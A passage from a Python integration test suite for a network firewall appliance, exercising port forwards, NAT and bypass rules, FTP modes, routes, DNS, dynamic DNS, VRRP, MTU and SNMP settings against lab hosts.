        # We will use iperf server and iperf for this test.
        # Also test that it can probably reach us (we're on a 10.x network)
        if not device_in_office:
            raise unittest.SkipTest("Not on office network, skipping")
        iperfAvail = global_functions.verify_iperf_configuration(wan_ip)
        if (not iperfAvail):
            raise unittest.SkipTest("iperf_server " + global_functions.iperf_server + " is unreachable, skipping")
        # Only if iperf is used
        # if not iperfResult:
        #     raise unittest.SkipTest("Iperf server not reachable")

        # port forward UDP 5000 to client box
        set_first_level_rule(create_port_forward_triple_condition("DST_PORT","5000","DST_LOCAL","true","PROTOCOL","UDP",remote_control.client_ip,"5000"),'portForwardRules')

        # start netcat on client
        remote_control.run_command("rm -f /tmp/netcat.udp.recv.txt")
        remote_control.run_command("nohup netcat -l -u -p 5000 >/tmp/netcat.udp.recv.txt",stdout=False,nowait=True)

        remote_control.run_command("echo test| netcat -q0 -w1 -u " + wan_ip + " 5000",host=global_functions.iperf_server)

        result = remote_control.run_command("grep test /tmp/netcat.udp.recv.txt")

        # send UDP packets through the port forward
        # UDP_speed = global_functions.get_udp_download_speed( receiverIP=remote_control.client_ip, senderIP=global_functions.iperf_server, targetIP=wan_ip )
        # assert (UDP_speed >  0.0)

        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)
        assert ( result == 0 )

    # test a NAT rules
    def test_050_nat_rule(self):
        # check if more than one WAN
        index_of_wans = global_functions.get_wan_tuples()
        if (len(index_of_wans) < 2):
            raise unittest.SkipTest("Need at least two public static WANS for test_050_natRule")

        for wan in index_of_wans:
            nuke_first_level_rule("natRules")
            # Create NAT rule for port 80
            set_first_level_rule(create_nat_rule("test out " + wan[1], "DST_PORT","80",wan[1]),"natRules")
            # Determine current outgoing IP
            result = global_functions.get_public_ip_address()
            assert (result == wan[2])

        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)

    # Test that bypass rules bypass apps
    def test_060_bypass_rules(self):
        app_fw = None
        if (global_functions.uvmContext.appManager().isInstantiated("firewall")):
            if NetworkTests.skip_instantiated():
                raise unittest.SkipTest('app %s already instantiated' % "firewall")
        app_fw = global_functions.uvmContext.appManager().instantiate("firewall", default_policy_id)
        nuke_first_level_rule('bypassRules')
        # verify port 80 is open
        result1 = remote_control.run_command(global_functions.build_wget_command(output_file="/dev/null", uri=f"http://test.untangle.com"))
        # Block port 80 and verify it's closed
        append_firewall_rule(app_fw, create_single_condition_firewall_rule("DST_PORT","80"))
        result2 = remote_control.run_command(global_functions.build_wget_command(output_file="/dev/null", uri=f"http://test.untangle.com/"))

        # add bypass rule for the client and enable bypass logging
        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
        netsettings['bypassRules']['list'].append( create_bypass_condition_rule("SRC_ADDR",remote_control.client_ip) )
        netsettings['logBypassedSessions'] = True
        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)

        # verify the client can still get out (and that the traffic is bypassed)
        result3 = remote_control.run_command(global_functions.build_wget_command(output_file="/dev/null", uri=f"http://test.untangle.com/"))

        events = global_functions.get_events('Network','Bypassed Sessions',None,100)

        global_functions.uvmContext.appManager().destroy( app_fw.getAppSettings()["id"] )
        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)
        assert (result1 == 0)
        assert (result2 != 0)
        assert (result3 == 0)

        assert(events != None)
        found = global_functions.check_events( events.get('list'), 100,
                                               "s_server_addr", test_untangle_com_ip,
                                               "c_client_addr", remote_control.client_ip,
                                               "local_addr", remote_control.client_ip,
                                               "remote_addr", test_untangle_com_ip,
                                               "s_server_port", 80)
        assert(found)

    # Test FTP (outbound) in active and passive modes
    @pytest.mark.failure_in_podman
    def test_070_ftp_modes(self):
        nuke_first_level_rule('bypassRules')

        pasv_result = remote_control.run_command(global_functions.build_wget_command(output_file="/dev/null", user=self.ftpUserName, password=self.ftpPassword, uri=f"ftp://{global_functions.ftp_server}/{ftp_file_name}"))
        port_result = remote_control.run_command(global_functions.build_wget_command(output_file="/dev/null", extra_arguments="--no-passive-ftp", user=self.ftpUserName, password=self.ftpPassword, uri=f"ftp://{global_functions.ftp_server}/{ftp_file_name}"))
        epsv_result = remote_control.run_command(global_functions.build_curl_command(output_file="/dev/null", user=self.ftpUserName, password=self.ftpPassword, extra_arguments="--epsv", uri=f"ftp://{global_functions.ftp_server}/{ftp_file_name}"))
        eprt_result = remote_control.run_command(global_functions.build_curl_command(output_file="/dev/null", user=self.ftpUserName, password=self.ftpPassword, extra_arguments="--eprt -P -", uri=f"ftp://{global_functions.ftp_server}/{ftp_file_name}"))
        print(("port_result: %i eprt_result: %i pasv_result: %i epsv_result: %i" % (port_result,eprt_result,pasv_result,epsv_result)))
        assert (pasv_result == 0)
        if not device_is_pppoe:
            assert (port_result == 0)
        # assert (epsv_result == 0) # won't fix NGFW-1449
        # assert (eprt_result == 0) # won't fix NGFW-1449

    # Test FTP (outbound) in active and passive modes with a firewall block all rule (firewall should pass related sessions without special rules)
    @pytest.mark.failure_in_podman
    def test_071_ftp_modes_firewalled(self):
        app_fw = None
        if (global_functions.uvmContext.appManager().isInstantiated("firewall")):
            print(("ERROR: App %s already installed" % "firewall"))
            raise Exception('app %s already instantiated' % "firewall")
        app_fw = global_functions.uvmContext.appManager().instantiate("firewall", default_policy_id)

        nuke_first_level_rule('bypassRules')

        append_firewall_rule(app_fw, create_single_condition_firewall_rule("DST_PORT","21", blocked=False))
        append_firewall_rule(app_fw, create_single_condition_firewall_rule("PROTOCOL","TCP", blocked=True))

        pasv_result = remote_control.run_command(global_functions.build_wget_command(output_file="/dev/null", user=self.ftpUserName, password=self.ftpPassword, uri=f"ftp://{global_functions.ftp_server}/{ftp_file_name}"))
        port_result = remote_control.run_command(global_functions.build_wget_command(output_file="/dev/null", extra_arguments="--no-passive-ftp", user=self.ftpUserName, password=self.ftpPassword, uri=f"ftp://{global_functions.ftp_server}/{ftp_file_name}"))
        epsv_result = remote_control.run_command(global_functions.build_curl_command(output_file="/dev/null", user=self.ftpUserName, password=self.ftpPassword, extra_arguments="--epsv", uri=f"ftp://{global_functions.ftp_server}/{ftp_file_name}"))
        eprt_result = remote_control.run_command(global_functions.build_curl_command(output_file="/dev/null", user=self.ftpUserName, password=self.ftpPassword, extra_arguments="--eprt -P -", uri=f"ftp://{global_functions.ftp_server}/{ftp_file_name}"))

        global_functions.uvmContext.appManager().destroy( app_fw.getAppSettings()["id"] )
        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)

        print(("port_result: %i eprt_result: %i pasv_result: %i epsv_result: %i" % (port_result,eprt_result,pasv_result,epsv_result)))
        assert (pasv_result == 0)
        if not device_is_pppoe:
            assert (port_result == 0)
        # assert (epsv_result == 0) # won't fix NGFW-1449
        # assert (eprt_result == 0) # won't fix NGFW-1449

    # Test FTP (outbound) in active and passive modes with bypass
    @pytest.mark.failure_in_podman
    def test_072_ftp_modes_bypassed(self):
        set_first_level_rule(create_bypass_condition_rule("DST_PORT","21"),'bypassRules')

        pasv_result = remote_control.run_command(global_functions.build_wget_command(output_file="/dev/null", user=self.ftpUserName, password=self.ftpPassword, uri=f"ftp://{global_functions.ftp_server}/{ftp_file_name}"))
        port_result = remote_control.run_command(global_functions.build_wget_command(output_file="/dev/null", extra_arguments="--no-passive-ftp", user=self.ftpUserName, password=self.ftpPassword, uri=f"ftp://{global_functions.ftp_server}/{ftp_file_name}"))
        epsv_result = remote_control.run_command(global_functions.build_curl_command(output_file="/dev/null", user=self.ftpUserName, password=self.ftpPassword, extra_arguments="--epsv", uri=f"ftp://{global_functions.ftp_server}/{ftp_file_name}"))
        eprt_result = remote_control.run_command(global_functions.build_curl_command(output_file="/dev/null", user=self.ftpUserName, password=self.ftpPassword, extra_arguments="--eprt -P -", uri=f"ftp://{global_functions.ftp_server}/{ftp_file_name}"))

        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)

        print(("port_result: %i eprt_result: %i pasv_result: %i epsv_result: %i" % (port_result,eprt_result,pasv_result,epsv_result)))
        assert (pasv_result == 0)
        if not device_is_pppoe:
            assert (port_result == 0)
        # assert (epsv_result == 0) # won't fix NGFW-1449
        # assert (eprt_result == 0) # won't fix NGFW-1449

    # Test FTP (outbound) in active and passive modes with bypass with a block all rule in forward filter rules. It should pass RELATED session automatically
    @pytest.mark.failure_in_podman
    def test_073_ftp_modes_bypassed_filtered(self):
        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
        netsettings['bypassRules']['list'] = [ create_bypass_condition_rule("DST_PORT","21") ]
        netsettings['filterRules']['list'] = [ create_filter_rules("DST_PORT","21","PROTOCOL","TCP",False), create_filter_rules("DST_PORT","1-65535","PROTOCOL","TCP",True) ]
        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)

        pasv_result = remote_control.run_command(global_functions.build_wget_command(output_file="/dev/null", user=self.ftpUserName, password=self.ftpPassword, uri=f"ftp://{global_functions.ftp_server}/{ftp_file_name}"))
        port_result = remote_control.run_command(global_functions.build_wget_command(output_file="/dev/null", extra_arguments="--no-passive-ftp", user=self.ftpUserName, password=self.ftpPassword, uri=f"ftp://{global_functions.ftp_server}/{ftp_file_name}"))
        epsv_result = remote_control.run_command("curl --user "+ self.ftpUserName + ":" + self.ftpPassword + " --epsv -s -o /dev/null ftp://" + global_functions.ftp_server + "/" + ftp_file_name)
        eprt_result = remote_control.run_command("curl --user "+ self.ftpUserName + ":" + self.ftpPassword + " --eprt -P - -s -o /dev/null ftp://" + global_functions.ftp_server + "/" + ftp_file_name)

        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)

        print(("port_result: %i eprt_result: %i pasv_result: %i epsv_result: %i" % (port_result,eprt_result,pasv_result,epsv_result)))
        assert (pasv_result == 0)
        if not device_is_pppoe:
            assert (port_result == 0)
        # assert (epsv_result == 0) # won't fix NGFW-1449
        # assert (eprt_result == 0) # won't fix NGFW-1449

    # Test FTP (inbound) in active and passive modes (untangle-vm should add port forwards for RELATED session)
    def test_074_ftp_modes_incoming(self):
        if not run_ftp_inbound_tests:
            raise unittest.SkipTest("remote client does not have ftp server")
        if not device_in_office:
            raise unittest.SkipTest("Not on office network, skipping")

        set_first_level_rule(create_port_forward_triple_condition("DST_PORT","21","DST_LOCAL","true","PROTOCOL","TCP",remote_control.client_ip,""),'portForwardRules')

        pasv_result = remote_control.run_command(global_functions.build_wget_command(output_file="/dev/null", uri=f"ftp://{wan_ip}/{ftp_file_name}"), host=office_ftp_client)
        port_result = remote_control.run_command(global_functions.build_wget_command(output_file="/dev/null", extra_arguments="--no-passive-ftp", uri=f"ftp://{wan_ip}/{ftp_file_name}"), host=office_ftp_client)
        epsv_result = remote_control.run_command(global_functions.build_curl_command(output_file="/dev/null", extra_arguments="--epsv", uri=f"ftp://{wan_ip}/{ftp_file_name}"), host=office_ftp_client)
        eprt_result = remote_control.run_command(global_functions.build_curl_command(output_file="/dev/null", extra_arguments="--eprt -P -", uri=f"ftp://{wan_ip}/{ftp_file_name}"), host=office_ftp_client)

        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)

        print(("port_result: %i eprt_result: %i pasv_result: %i epsv_result: %i" % (port_result,eprt_result,pasv_result,epsv_result)))
        assert (pasv_result == 0)
        if not device_is_pppoe:
            assert (port_result == 0)
        # assert (epsv_result == 0) # won't fix NGFW-1449
        # assert (eprt_result == 0) # won't fix NGFW-1449

    # Test FTP (inbound) in active and passive modes with bypass (nf_nat_ftp should add port forwards for RELATED session, nat filters should allow RELATED)
    def test_075_ftp_modes_incoming_bypassed(self):
        if not run_ftp_inbound_tests:
            raise unittest.SkipTest("remote client does not have ftp server")
        if not device_in_office:
            raise unittest.SkipTest("Not on office network, skipping")
        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
        netsettings['bypassRules']['list'] = [ create_bypass_condition_rule("DST_PORT","21") ]
        netsettings['portForwardRules']['list'] = [ create_port_forward_triple_condition("DST_PORT","21","DST_LOCAL","true","PROTOCOL","TCP",remote_control.client_ip,"") ]
        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)

        pasv_result = remote_control.run_command(global_functions.build_wget_command(output_file="/dev/null", uri=f"ftp://{wan_ip}/{ftp_file_name}"), host=office_ftp_client)
        port_result = remote_control.run_command(global_functions.build_wget_command(output_file="/dev/null", extra_arguments="--no-passive-ftp", uri=f"ftp://{wan_ip}/{ftp_file_name}"), host=office_ftp_client)
        epsv_result = remote_control.run_command(global_functions.build_curl_command(output_file="/dev/null", extra_arguments="--epsv", uri=f"ftp://{wan_ip}/{ftp_file_name}"), host=office_ftp_client)
        eprt_result = remote_control.run_command(global_functions.build_curl_command(output_file="/dev/null", extra_arguments="--eprt -P -", uri=f"ftp://{wan_ip}/{ftp_file_name}"), host=office_ftp_client)

        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)

        print(("port_result: %i eprt_result: %i pasv_result: %i epsv_result: %i" % (port_result,eprt_result,pasv_result,epsv_result)))
        assert (pasv_result == 0)
        if not device_is_pppoe:
            assert (port_result == 0)
        # assert (epsv_result == 0) # won't fix NGFW-1449
        # assert (eprt_result == 0) # won't fix NGFW-1449

    # Test static route that routing test.untangle.com to 127.0.0.1 makes it unreachable
    def test_080_routes(self):
        preResult = remote_control.is_online()

        # add a route to 127.0.0.1 to blackhole that IP
        set_first_level_rule(create_route_rule(test_untangle_com_ip,32,"127.0.0.1"),'staticRoutes')

        postResult = remote_control.run_command(global_functions.build_wget_command(uri="http://test.untangle.com"))

        # restore setting before validating results
        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)

        assert (preResult == 0)
        assert (postResult != 0)

    # Test static DNS entry
    def test_090_static_dns_entry(self):
        # Test static entries in Config -> Networking -> Advanced -> DNS
        nuke_dns_rules()
        add_dns_rule(create_dns_rule(global_functions.ftp_server,"www.foobar.com"))
        result_mod = remote_control.run_command("host -R3 -4 www.foobar.com " + wan_ip, stdout=True)
        # print("Results of www.foobar.com <%s>" % result)
        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)

        match = re.search(r'address \d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}', result_mod)
        ip_address_foobar = (match.group()).replace('address ','')
        # print("IP address of www.foobar.com <%s>" % ip_address_foobar)
        print(("Result expected:\"%s\" actual:\"%s\"" % (str(global_functions.ftp_server),str(ip_address_foobar))))
        assert(global_functions.ftp_server == ip_address_foobar)

    # Test dynamic hostname
    @pytest.mark.slow
    def test_100_dynamic_dns(self):
        """
        Dynamic DNS
        """
        if runtests.quick_tests_only:
            raise unittest.SkipTest("Skipping a time consuming test")
        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
        index_of_wans = global_functions.get_wan_tuples()
        if (len(index_of_wans) > 1):
            raise unittest.SkipTest("More than 1 WAN does not work with Dynamic DNS NGFW-5543")

        ddclient_cache_file = "/var/cache/ddclient/ddclient.cache"
        ddclient_file = "/etc/ddclient.conf"

        # Get the current WAN address
        # The standard target myip.dnsomatic.com does rate limiting, so we'll pause
        server_timeout=30
        print(f"getting outside IP adddress, waiting {server_timeout} to avoid host limiting...")
        sys.stdout.flush()
        time.sleep(30)
        outside_IP = global_functions.get_public_ip_address(base_URL="myip.dnsomatic.com",url_path="", localcall=True)
        print(f"outside_IP={outside_IP}")

        # Disable
        netsettings['dynamicDnsServiceEnabled'] = False
        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)

        # Get available dynamic host addresses
        names,x = global_functions.get_live_account_info("dyndns")
        if names == None:
            assert False, "unable to get dyndns names"
        dynamic_dns_hostname = names.split(",")[0]

        # Get dynamic host provider credentials
        dyn_DNS_user_name, dyn_DNS_password = global_functions.get_live_account_info(names)
        if dyn_DNS_user_name == None or dyn_DNS_user_name == "message":
            assert False, f"unable to get dyndns credentials for {dynamic_dns_hostname}"

        #
        # Reset settings to a bogus address
        #
        # Fixed configuration based on what we write with sync-settings.
        # We use this to force the host to a different IP address
        ddclient_file_config = f"""
## Auto Generated
## DO NOT EDIT. Changes will be overwritten.
pid=/var/run/ddclient.pid
protocol=dyndns2
login={dyn_DNS_user_name}
password={dyn_DNS_password}
ssl=yes
server=dynupdate.no-ip.com
{dynamic_dns_hostname}
"""
        print(ddclient_file_config)

        with open(ddclient_file, "w") as f:
            f.write(ddclient_file_config)

        # Clear cache
        if os.path.isfile(ddclient_cache_file):
            os.remove(ddclient_cache_file)

        # Manually set to the bogus address
        bogus_ip_address = "1.2.3.4"
        subprocess.call(["ddclient","-daemon=0","-use=ip", f"-ip={bogus_ip_address}"],stdout=subprocess.PIPE,stderr=subprocess.PIPE) # force it to run faster

        # Loop waiting until a DNS lookup returns bogus address
        loop_counter = 12
        dyn_IP_found = False
        while loop_counter > 0 and not dyn_IP_found:
            loop_counter -= 1
            dynIP = global_functions.get_hostname_ip_address(hostname=dynamic_dns_hostname)
            dynIP = dynIP.decode('utf8')
            print(f"reset: dynamic_dns_hostname={dynamic_dns_hostname}, dynIP={dynIP}")
            sys.stdout.flush()
            dyn_IP_found = False
            if bogus_ip_address == dynIP:
                dyn_IP_found = True
            else:
                time.sleep(10)
        assert dyn_IP_found, "reset succeeded"

        # Configure NGFW to use
        if os.path.isfile(ddclient_cache_file):
            os.remove(ddclient_cache_file)

        netsettings['dynamicDnsServiceEnabled'] = True
        netsettings['dynamicDnsServiceHostnames'] = dynamic_dns_hostname
        netsettings['dynamicDnsServiceName'] = "no-ip"
        netsettings['dynamicDnsServiceUsername'] = dyn_DNS_user_name
        netsettings['dynamicDnsServicePassword'] = dyn_DNS_password
        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)

        loop_counter = 12
        dyn_IP_found = False
        while loop_counter > 0 and not dyn_IP_found:
            loop_counter -= 1
            dynIP = global_functions.get_hostname_ip_address(hostname=dynamic_dns_hostname)
            dynIP = dynIP.decode('utf8')
            print(f"verify: dynamic_dns_hostname={dynamic_dns_hostname}, outside_IP={outside_IP}, current dynIP={dynIP}")
            sys.stdout.flush()
            dyn_IP_found = False
            if outside_IP == dynIP:
                dyn_IP_found = True
            else:
                time.sleep(10)

        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)

        assert dyn_IP_found, "dynamnid DNS succeeded"

    # Test VRRP is active
    @pytest.mark.slow
    def test_110_vrrp(self):
        "Test that a VRRP alias is pingable"
        if runtests.quick_tests_only:
            raise unittest.SkipTest('Skipping a time consuming test')
        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
        # Find a static interface
        i=0
        interfaceNotFound = True
        for interface in netsettings['interfaces']['list']:
            if (interface['v4ConfigType'] == "STATIC" and not netsettings['interfaces']['list'][i].get('disabled')):
                interfaceNotFound = False
                break
            i += 1
        # Verify interface is found
        if interfaceNotFound:
            raise unittest.SkipTest("No static enabled interface found")
        interface = netsettings['interfaces']['list'][i]
        interfaceId = interface.get('interfaceId')
        interfaceIP = interface.get('v4StaticAddress')
        interfacePrefix = interface.get('v4StaticPrefix')
        interfaceNet = interfaceIP + "/" + str(interfacePrefix)
        print(("using interface: %i %s\n" % (interfaceId, interface.get('name'))))
        # get next IP not used

        # verify that this NIC is connected (otherwise keepalive wont claim address)
        try:
            result = subprocess.check_output(
                "ethtool " + interface.get('symbolicDev') + " 2>/dev/null | grep 'Link detected:'",
                shell=True,
                text=True
            )
            if "yes" not in result:
                raise unittest.SkipTest('LAN not connected')
        except Exception:
            raise unittest.SkipTest('LAN not connected')

        ipStep = 1
        loopCounter = 10
        vrrpIP = None
        ip = ipaddr.IPAddress(interfaceIP)
        while vrrpIP == None and loopCounter:
            # get next IP and test that it is unused
            newip = ip + ipStep
            # check to see if the IP is in network range
            if newip in ipaddr.IPv4Network(interfaceNet):
                pingResult = remote_control.run_command("ping -c 1 %s" % str(newip))
                if pingResult:
                    # new IP found
                    vrrpIP = newip
            else:
                # The IP is beyond the range of the network, go backward through the IPs
                ipStep = -1
            loopCounter -= 1
            ip = newip
        if (vrrpIP == None):
            raise unittest.SkipTest("No IP found for VRRP")

        # Set VRRP values
        netsettings['interfaces']['list'][i]['vrrpAliases'] = {
            "javaClass": "java.util.LinkedList",
            "list": [{
                    "javaClass": "com.untangle.uvm.network.InterfaceSettings$InterfaceAlias",
                    "staticAddress": str(vrrpIP),
                    "staticPrefix": 24
                    }]
            }
        netsettings['interfaces']['list'][i]['vrrpEnabled'] = True
        netsettings['interfaces']['list'][i]['vrrpId'] = 2
        netsettings['interfaces']['list'][i]['vrrpPriority'] = 1
        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)

        for x in range(3):
            pingResult = remote_control.run_command("ping -c 1 %s" % str(vrrpIP))
            if pingResult == 0:
                break
        #Fix for ATS server, recheck if isVrrpMaster is taking time
        for x in range(4):
            isMaster = global_functions.uvmContext.networkManager().isVrrpMaster(interfaceId)
            if isMaster:
                print("VRRP master is enabled after {} iterations".format(str(x)))
                break
        onlineResults = remote_control.is_online()

        # Return to default network state
        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)

        assert (isMaster)
        assert (pingResult == 0)
        assert (onlineResults == 0)

    def test_120_mtu(self):
        # Test MTU settings

        # An Ethernet device's default MTU is set by the driver.
        # In most cases we've ever seen, it's 1500.  However, we don't know that for certain for all drivers.
        # This test assumes that we come in with the default value from the driver.
        # After the test is finished, we'll set back to what we found.

        # Common MTU values
        # None and 0 are "auto"
        mtus = [None, 0, 1460, 1500, 9000]

        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()

        # Perform MTU tests against WAN devices.
        # Since tests are run from LAN devices, if something goes bad, 
        # we won't put the system in a bad state.

        # Get WAN interfaces
        wan_physical_devices = []
        # PPPoE interfaces use a symbolic name like ppp0 on top of a physical name like eth0
        wan_pppoe_devices = {}
        default_mtu_values = []
        for interface in netsettings["interfaces"]["list"]:
            if interface["isWan"] is not True:
                continue
            if interface.get("configType") == 'DISABLED':
                continue
            physical_device = interface["physicalDev"]
            wan_physical_devices.append(physical_device)

            if interface["v4ConfigType"] == "PPPOE":
                wan_pppoe_devices[physical_device] = interface["symbolicDev"]

            # Get default MTU
            mtu_auto_value = None
            ip_addr_results = subprocess.check_output(f"ip link show {physical_device}", shell=True)
            re_value = re.search(r'mtu\s(\S+)', ip_addr_results.decode("utf-8"))
            if re_value:
                mtu_auto_value = re_value.group(1)
            default_mtu_values.append(mtu_auto_value)

        print(f"wan_physical_devices={wan_physical_devices}")
        print(f"wan_pppoe_devices={wan_pppoe_devices}")
        print(f"default_mtu_values={default_mtu_values}")

        # Most tests use asserts to stop the test on the first failure.
        # However, because we're trying to preserve the concept of a "default"
        # MTU value, we can't break out of the test.
        # Instead, run these tests in try/except and throw any exceptions
        # generared by an AssertException into a list of failure.
        # Then after success or failure, we can reset the MTU back and
        # assrt on the failure list being empty or not.
        failures = []
        try:
            # pppoe_failures = []
            for mtu in mtus:
                # Set MTU on devices
                print(f"\ntesting mtu={mtu}")
                for wan_index, device in enumerate(wan_physical_devices):
                    for i in range(len(netsettings['devices']['list'])):
                        if netsettings['devices']['list'][i]['deviceName'] == device:
                            netsettings['devices']['list'][i]['mtu'] = mtu
                            break

                global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)

                for wan_index, device in enumerate(wan_physical_devices):
                    # Get the device MTU
                    ip_addr_results = subprocess.check_output(f"ip link show {physical_device}", shell=True)
                    re_value = re.search(r'mtu\s(\S+)', ip_addr_results.decode("utf-8"))
                    current_mtu_value = None
                    if re_value:
                        current_mtu_value = re_value.group(1)
                    print(f"current: {device} {current_mtu_value}")
                    if mtu is None or mtu == 0:
                        expected_mtu = default_mtu_values[wan_index]
                    else:
                        expected_mtu = mtu
                    print(f"mtu match: {device} {current_mtu_value}={expected_mtu}")
                    assert current_mtu_value == str(expected_mtu), f"{device}: current_mtu_value={current_mtu_value} == expected_mtu={expected_mtu}"

                    if device in wan_pppoe_devices:
                        pppoe_device = wan_pppoe_devices[device]
                        print(f"pppoe_device={pppoe_device}")
                        # On a bad MTU value, the PPPOE device won't come up
                        result = subprocess.call(f"ip link show | grep -q {pppoe_device}", shell=True)
                        assert result == 0, f"found pppoe_device={pppoe_device}"

                    if len(failures) > 0:
                        # No need to keep running if we have a failure
                        break
        except Exception as e:
            failures.append(e)

        # Reset back to defaults
        # Settins back to the "auto" value
        for i in range(len(netsettings['devices']['list'])):
            netsettings['devices']['list'][i]['mtu'] = 0

        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)

        # Manually set interface mtus back to original values
        for index, device in enumerate(wan_physical_devices):
            subprocess.check_output(f"ip link set {device} mtu {default_mtu_values[index]}", shell=True)

        assert len(failures) == 0, ", ".join(map(str, failures))

    # SNMP, v1/v2enabled, v3 disabled
    def test_130_snmp_v1v2_only(self):
        verify_snmp_walk()
        orig_system_settings = global_functions.uvmContext.systemManager().getSettings()
        system_settings = global_functions.uvmContext.systemManager().getSettings()
        system_settings['snmpSettings']['enabled'] = True
        system_settings['snmpSettings']['communityString'] = "atstest"
        system_settings['snmpSettings']['sysContact'] = "qa@untangle.com"
        system_settings['snmpSettings']['sendTraps'] = True
        system_settings['snmpSettings']['trapHost'] = remote_control.client_ip
        system_settings['snmpSettings']['port'] = 161
        system_settings['snmpSettings']['v3Enabled'] = False
        global_functions.uvmContext.systemManager().setSettings(system_settings)
        v2cResult = remote_control.run_command("snmpwalk -v 2c -c atstest " +  global_functions.get_lan_ip() + " | grep untangle")
        v3Result = remote_control.run_command("snmpwalk -v 3 -u testuser -l authPriv -a sha -A password -x des -X drowssap " +  global_functions.get_lan_ip() + " | grep untangle")
        global_functions.uvmContext.systemManager().setSettings(orig_system_settings)
        assert( v2cResult == 0 )
        assert( v3Result == 1 )

    def test_133_snmp_v3_sha_des(self):
        verify_snmp_walk()
        orig_system_settings = global_functions.uvmContext.systemManager().getSettings()
        system_settings = global_functions.uvmContext.systemManager().getSettings()
        system_settings['snmpSettings']['enabled'] = True
        system_settings['snmpSettings']['communityString'] = "atstest"
        system_settings['snmpSettings']['sysContact'] = "qa@untangle.com"
        system_settings['snmpSettings']['sendTraps'] = True
        system_settings['snmpSettings']['trapHost'] = remote_control.client_ip
        system_settings['snmpSettings']['port'] = 161
        commands = set_snmp_v3_settings( system_settings['snmpSettings'], True, "testuser", "sha", "shapassword", "des", "despassword", False )
        global_functions.uvmContext.systemManager().setSettings(system_settings)
        v2cResult = try_snmp_command( commands[0] )
        v3Result = try_snmp_command( commands[1] )
        global_functions.uvmContext.systemManager().setSettings(orig_system_settings)
        assert( v2cResult == 0 )
        assert( v3Result == 0 )

    def test_134_snmp_v3_sha_aes(self):
        verify_snmp_walk()
        orig_system_settings = global_functions.uvmContext.systemManager().getSettings()
        system_settings = global_functions.uvmContext.systemManager().getSettings()
        system_settings['snmpSettings']['enabled'] = True
        system_settings['snmpSettings']['communityString'] = "atstest"
        system_settings['snmpSettings']['sysContact'] = "qa@untangle.com"
        system_settings['snmpSettings']['sendTraps'] = True
        system_settings['snmpSettings']['trapHost'] = remote_control.client_ip
        system_settings['snmpSettings']['port'] = 161
        commands = set_snmp_v3_settings( system_settings['snmpSettings'], True, "testuser", "sha", "shapassword", "aes", "aespassword", False )
        global_functions.uvmContext.systemManager().setSettings(system_settings)
        v2cResult = try_snmp_command( commands[0] )
        v3Result = try_snmp_command( commands[1] )
        global_functions.uvmContext.systemManager().setSettings(orig_system_settings)
        assert( v2cResult == 0 )
        assert( v3Result == 0 )

    def test_135_snmp_v3_md5_des(self):
        verify_snmp_walk()
        orig_system_settings = global_functions.uvmContext.systemManager().getSettings()
        system_settings = global_functions.uvmContext.systemManager().getSettings()
        system_settings['snmpSettings']['enabled'] = True
        system_settings['snmpSettings']['communityString'] = "atstest"
        system_settings['snmpSettings']['sysContact'] = "qa@untangle.com"
        system_settings['snmpSettings']['sendTraps'] = True
        system_settings['snmpSettings']['trapHost'] = remote_control.client_ip
        system_settings['snmpSettings']['port'] = 161
        commands = set_snmp_v3_settings( system_settings['snmpSettings'], True, "testuser", "md5", "md5password", "des", "despassword", False )
        global_functions.uvmContext.systemManager().setSettings(system_settings)
        v2cResult = try_snmp_command( commands[0] )
        v3Result = try_snmp_command( commands[1] )
        global_functions.uvmContext.systemManager().setSettings(orig_system_settings)
        assert( v2cResult == 0 )
        assert( v3Result == 0 )

    def test_136_snmp_v3_md5_aes(self):
        verify_snmp_walk()
        orig_system_settings = global_functions.uvmContext.systemManager().getSettings()
        system_settings = global_functions.uvmContext.systemManager().getSettings()
        system_settings['snmpSettings']['enabled'] = True
        system_settings['snmpSettings']['communityString'] = "atstest"
        system_settings['snmpSettings']['sysContact'] = "qa@untangle.com"
        system_settings['snmpSettings']['sendTraps'] = True
        system_settings['snmpSettings']['trapHost'] = remote_control.client_ip
        system_settings['snmpSettings']['port'] = 161
        commands = set_snmp_v3_settings( system_settings['snmpSettings'], True, "testuser", "md5", "md5password", "aes", "aespassword", False )
        global_functions.uvmContext.systemManager().setSettings(system_settings)
        v2cResult = try_snmp_command( commands[0] )
        v3Result = try_snmp_command( commands[1] )
        global_functions.uvmContext.systemManager().setSettings(orig_system_settings)
        assert( v2cResult == 0 )
        assert( v3Result == 0 )

    def test_137_snmp_v3_required(self):
        verify_snmp_walk()
        orig_system_settings = global_functions.uvmContext.systemManager().getSettings()
        system_settings = global_functions.uvmContext.systemManager().getSettings()
        system_settings['snmpSettings']['enabled'] = True
        system_settings['snmpSettings']['communityString'] = "atstest"
        system_settings['snmpSettings']['sysContact'] = "qa@untangle.com"
        system_settings['snmpSettings']['sendTraps'] = True
        system_settings['snmpSettings']['trapHost'] = remote_control.client_ip
        system_settings['snmpSettings']['port'] = 161
        commands = set_snmp_v3_settings( system_settings['snmpSettings'], True, "testuser", "sha", "shapassword", "aes", "aespassword", True )
        global_functions.uvmContext.systemManager().setSettings(system_settings)
        v2cResult = try_snmp_command( commands[0] )
